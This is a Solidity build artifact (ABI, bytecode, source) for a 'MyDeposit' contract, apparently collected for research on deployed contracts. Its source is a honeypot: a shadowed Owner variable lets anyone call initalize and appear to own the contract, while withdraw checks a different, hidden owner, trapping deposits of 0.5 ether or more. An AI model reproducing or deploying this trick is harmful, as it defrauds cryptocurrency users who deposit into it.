{
  "contractName": "MyDeposit",
  "abi": [
    {
      "constant": false,
      "inputs": [
        {
          "name": "_Owner",
          "type": "address"
        }
      ],
      "name": "transferOwner",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "Owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "openDate",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "name": "deposits",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_openDate",
          "type": "uint256"
        }
      ],
      "name": "initalize",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "deposit",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "kill",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610549806100536000396000f30060806040526004361061008e576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680632e1a7d4d1461009057806341c0e1b5146100bd5780634fb2e45d146100d457806399eb660314610117578063b4a99a4e14610137578063d0e30db01461018e578063ec8cb28114610198578063fc7e286d146101c3575b005b34801561009c57600080fd5b506100bb6004803603810190808035906020019092919050505061021a565b005b3480156100c957600080fd5b506100d261031a565b005b3480156100e057600080fd5b50610115600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610355565b005b61013560048036038101908080359060200190929190505050610425565b005b34801561014357600080fd5b5061014c610478565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b61019661049e565b005b3480156101a457600080fd5b506101ad6104ff565b6040518082815260200191505060405180910390f35b3480156101cf57600080fd5b50610204600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610505565b6040518082815260200191505060405180910390f35b60003373ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415610316576003544210151561031557600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490508082111580156102ce5750600081115b15610314573373ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f19350505050151561031357600080fd5b5b5b5b5050565b60003073ffffffffffffffffffffffffffffffffffffffff16311415610353573373ffffffffffffffffffffffffffffffffffffffff16ff5b565b3373ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16141561042257600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614151561042157806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5b50565b33600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508060038190555061047561049e565b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6706f05b59d3b20000341015156104fd5734600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055505b565b60035481565b600260205280600052604060002060009150905054815600a165627a7a72305820f0f32f6531e2176ee250284bfebb9c64311e30870834209614f5aa937ec18eb70029",
  "source": "\n\n\ncontract Ownable {\n    address public Owner;\n    constructor() public { Owner = msg.sender; }\n    modifier onlyOwner() { if (Owner == msg.sender) { _; } }\n    \n    function transferOwner(address _Owner) public onlyOwner {\n        if (_Owner != address(0))\n            Owner = _Owner;\n    }\n}\n\ncontract MyDeposit is Ownable {\n    address public Owner;\n    mapping (address => uint) public deposits;\n    uint public openDate;\n    \n    function initalize(uint _openDate) payable public {\n        Owner = msg.sender;\n        openDate = _openDate;\n        deposit();\n    }\n    \n    function() public payable {  }\n    \n    function deposit() public payable {\n        if (msg.value >= 0.5 ether)\n            deposits[msg.sender] += msg.value;\n    }\n\n    function withdraw(uint amount) public onlyOwner {\n        if (now >= openDate) {\n            uint max = deposits[msg.sender];\n            if (amount <= max && max > 0)\n                if (!msg.sender.send(amount))\n                    revert();\n        }\n    }\n    \n    function kill() public {\n        if (address(this).balance == 0)\n            selfdestruct(msg.sender);\n    }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x5c8546a7b86ba30202c09a84f5a72644a2a4f7ba/contracts/0x5c8546a7b86ba30202c09a84f5a72644a2a4f7ba.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:55:16.840Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}